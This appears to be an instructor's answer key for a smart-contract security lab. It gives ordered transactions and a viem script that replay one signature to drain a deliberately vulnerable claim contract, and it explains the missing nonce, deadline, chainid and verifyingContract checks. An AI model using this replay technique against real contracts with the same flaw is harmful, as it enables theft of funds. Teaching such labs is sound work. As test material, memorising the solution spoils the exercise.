# Q-10 — Instructor Playbook

> Ordered transactions to reach `isSolved(user) == true`. Keep out of student materials.

`LAB` = deployed `Q10ReplayLab` (pre-funded with at least `SEED * N` ETH).
`USER` = user's EOA (their own pk signs the payload).

## Steps

| # | From | To | Call | Args | Notes |
|---|---|---|---|---|---|
| 1 | `USER` | `LAB` | `createInstance(address)` | `(USER)` | deploys personal claim with `signer = USER`, seeds with 5 ETH |
| 2 | view | `LAB` | `claimOf(USER)` | — | snapshot claim address |
| 3 | off-chain | wallet | `personal_sign(rawHash)` where `rawHash = keccak256(abi.encode(USER, 1e18))` | — | wallet signs `\x19Ethereum Signed Message:\n32 || rawHash`; one 65-byte sig |
| 4..8 | `USER` | `claim` | `claim(address,uint256,bytes)` × 5 | `(USER, 1e18, sig)` | each call sends 1 ETH from claim → USER; balances after each call: 4e18, 3e18, 2e18, 1e18, 0 |
| 9 | view | `LAB` | `isSolved(USER)` | — | `true` |

## viem reference

```ts
const raw = keccak256(encodeAbiParameters(
  [{ type: 'address' }, { type: 'uint256' }],
  [USER, parseEther('1')]
));
const sig = await walletClient.signMessage({ message: { raw } });

for (let i = 0; i < 5; i++) {
  await walletClient.writeContract({
    address: claim,
    abi,
    functionName: 'claim',
    args: [USER, parseEther('1'), sig],
  });
}
```

## Why this drains

- `signature` is over `keccak256(abi.encode(to, amount))` only.
- No nonce → same digest → same sig accepted repeatedly.
- No deadline → never expires.
- No `chainid` → cross-chain replay if signer ever reuses this on another
  chain (not exercised here, but worth pointing out).
- No `verifyingContract` → if signer signs the same `(to, amount)` for a
  *different* claim contract, our claim still accepts it.

## A 6th replay is what reverts

After step 8 the claim's balance is `0`. The 6th call still passes the
signature check (the digest is still valid!), but `to.call{value: 1 ether}("")`
fails because the contract has no funds — `require(ok, "send failed")`
trips. This is *not* a replay defense; it's just running out of money.

## Notes

- The `signer` argument to `createInstance` is whatever address the user
  passes. The expected usage is `createInstance(USER)` so that USER's own
  pk produces valid signatures. Passing some other address means USER
  would need *that* address's pk to sign — useless in practice.
- Each user's claim contract is independent. Two users replaying
  simultaneously cannot affect each other's balance.
